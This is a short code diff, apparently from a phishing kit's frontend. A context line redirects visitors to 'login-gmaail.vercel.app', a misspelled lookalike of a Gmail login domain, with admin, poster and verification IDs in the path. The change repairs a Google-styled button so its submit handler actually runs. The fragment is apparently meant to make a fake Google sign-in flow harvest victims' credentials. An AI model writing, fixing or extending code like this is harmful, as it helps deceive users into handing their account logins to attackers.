@@ -72,7 +72,7 @@ router.push(`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
 
               <button
                 class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"
-                onClick={() => handleSubmitgoogle}
+                onClick={() => handleSubmitgoogle()}
               >
                 <span>
                   <img
